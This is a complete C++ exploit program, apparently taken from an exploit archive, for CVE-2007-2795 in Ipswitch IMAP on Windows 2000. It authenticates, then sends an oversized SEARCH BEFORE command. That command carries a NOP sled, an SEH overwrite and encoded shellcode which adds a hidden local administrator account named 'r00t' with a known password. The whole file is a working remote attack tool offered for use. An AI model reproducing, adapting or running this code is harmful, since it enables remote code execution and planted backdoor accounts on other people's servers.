/* Ipsbitch.cpp vs Ipswitch IMAP 
 * Tested on: Windows 2000 SP4
 * Ref: CVE-2007-2795
 *
 * Author: Dominic Chell <dmc@deadbeef.co.uk>
 * Found this half written on a VM so decided to finish it.
 *
 * Payload adds a local admin account USER=r00t PASS=r00tr00t!!
 *
 */

#include "stdafx.h"
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include "winsock2.h"

#pragma comment(lib, "ws2_32")

#define usage(){ (void)fprintf(stderr, "Ipsbitch vs Ipswitch IMAP <=v9.20\n(C) dmc <dmc@deadbeef.co.uk>\n\nExample: ipsbitch.exe [ip] [port] [user] [password]\n");}
#define error(e){ (void)fprintf(stderr,"%s\n",e); return -1;}

// USER=r00t PASS=r00tr00t!!
// Bad Chars = '\x00\x0a\x0d\x0b\x09\x0c\x20'
// Encoded with shikata ga nai
char shellcode[] =
	"\xda\xd4\x29\xc9\xb8\xb3\xfe\x8b\x54\xd9\x74\x24\xf4\xb1\x32"
	"\x5f\x83\xef\xfc\x31\x47\x14\x03\x47\xa7\x1c\x7e\xa8\x2f\xa4"
	"\x81\x51\xaf\xae\xc7\x6d\x24\xcc\xc2\xf5\x3b\xc2\x46\x4a\x23"
	"\x97\x06\x75\x52\x4c\xf1\xfe\x60\x19\x03\xef\xb9\xdd\x9d\x43"
	"\x3d\x1d\xe9\x9c\xfc\x54\x1f\xa2\x3c\x83\xd4\x9f\x94\x70\x11"
	"\x95\xf1\xf2\x46\x71\xf8\xef\x1f\xf2\xf6\xa4\x54\x5b\x1a\x3a"
	"\x80\xef\x3e\xb7\x57\x1b\xb7\x9b\x73\xdf\x04\x7c\x4d\x29\xea"
	"\xd5\xc9\x5e\xac\xe9\x9a\x21\x3c\x81\xed\xbd\x91\x1e\x65\xb6"
	"\x60\xd8\xf5\x06\x18\x49\x92\x76\x56\x6d\x3d\x1f\xfe\x90\x4b"
	"\xd1\xa9\x93\xab\x8d\x38\x08\x1a\x37\xba\xb5\x42\x98\x59\x16"
	"\xed\x83\xe9\x76\x84\x38\x74\x05\x46\xcd\x46\xd9\xf2\x11\xd4"
	"\x29\xcb\x25\x6a\x7a\x1b\xb2\xab\x5b\x7b\x15\xea\xdf\x3f\x49"
	"\xca\xf9\x9f\xe7\x77\x72\xc0\x9b\x18\x19\x61\x08\x81\xaf\x0e"
	"\xa5\x3d\x70\x90\x21\xd0\x19\x7c\xc3\x59\xae\xf2\x72\xe9\x21"
	"\x81\x07\x31\xcc\x55\xd8\x45\x10\xb9\x59\xe1\x14\xc5\x53";

char *seh = "\xC4\x2A\x02\x75";
//ws2help.dll - 0x75022AC4 - pop/pop/ret
char *nextseh = "\xeb\x10\x90\x90";
// short jmp nop nop

int main(int argc, char *argv[])
{
	SOCKET s;
	struct fd_set mask;
	struct timeval timeout; 
	struct sockaddr_in server;

	char user[20], pass[20];
	char payload[2048];
	char recvbuf[1024];
	if(argc < 4)
	{
		usage();
		return 0;
	}

	if((strlen(argv[3])<15) && (strlen(argv[4])<15))
	{
		strncpy(user, argv[3], 14);
		strncpy(pass, argv[4], 14);
		user[14] = '\0';
		pass[14] = '\0';
	}
	else {
		usage();
		return 0;
	}

	int ipaddr=htonl(inet_addr(argv[1])), port=atoi(argv[2]);;

	fprintf(stderr, "Ipsbitch vs Ipswitch IMAP <=v9.20\n(C) dmc <dmc@deadbeef.co.uk>\n\n");

	char auth[50];
	memset(auth, 0, sizeof(auth));
	memset(recvbuf, 0, sizeof(recvbuf));
	strcat(auth, "0 LOGIN ");
	strcat(auth, user);
	strcat(auth, " ");
	strcat(auth, pass);
	strcat(auth, "\r\n");
	strcat(auth, "\0");

	memset(payload, 0, sizeof(payload));
	strcat(payload, "2 SEARCH BEFORE ");
	for(int i=0; i<80; i++) strcat(payload, "\x90");
	strcat(payload, nextseh);
	strcat(payload, seh);
	for(int i=0; i<100; i++) strcat(payload, "\x90");
	strcat(payload, shellcode);
	for(int i=0; i<300; i++) strcat(payload, "\x90");
	strcat(payload, "\r\n");

	WSADATA info;
    if (WSAStartup(MAKEWORD(2,0), &info)) error("Unable to start WSA");

	s=socket(AF_INET,SOCK_STREAM,0);
	if (s==INVALID_SOCKET) error("[*] socket error");
	server.sin_family=AF_INET;
	server.sin_addr.s_addr=htonl(ipaddr);
	server.sin_port=htons(port);	

	WSAConnect(s,(struct sockaddr *)&server,sizeof(server),NULL,NULL,NULL,NULL);
	timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);

	select(s+1,NULL,&mask,NULL,&timeout);
	if(FD_ISSET(s,&mask))
		{
			fprintf(stderr, "[*] Connecting to IMAP server\n");
			Sleep(1000);recv(s,recvbuf,200,0);
			fprintf(stderr, "[*] Got banner:\n%s\n", recvbuf);
			memset(recvbuf, 0, sizeof(recvbuf));
			fprintf(stderr, "[*] Authenticating...\n");
			if (send(s,auth,strlen(auth),0)==SOCKET_ERROR) error("[*] error sending auth payload");
			memset(auth, 0, sizeof(auth));
			Sleep(1000);recv(s,recvbuf,200,0);
			fprintf(stderr, "[*] Received:\n%s\n", recvbuf);
			memset(recvbuf, 0, sizeof(recvbuf));
			fprintf(stderr, "[*] Sending SELECT command...\n");
			if (send(s,"1 SELECT INBOX\r\n",strlen("1 SELECT INBOX\r\n"),0)==SOCKET_ERROR) error("[*] error sending auth payload");
			Sleep(1000);recv(s,recvbuf,200,0);
			fprintf(stderr, "[*] Received:\n%s\n", recvbuf);
			memset(recvbuf, 0, sizeof(recvbuf));
			Sleep(1000);recv(s,recvbuf,200,0);
			fprintf(stderr, "[*] Received:\n%s\n", recvbuf);
			fprintf(stderr, "[*] Sending exploit payload...\n");
			if (send(s,payload,strlen(payload),0)==SOCKET_ERROR) error("[*] error sending exploit payload");
			memset(payload, 0, sizeof(payload));
			fprintf(stderr, "[*] Now try USER=r00t PASS=r00tr00t!!\n");
			return 0;
		}
}

// milw0rm.com [2009-09-14]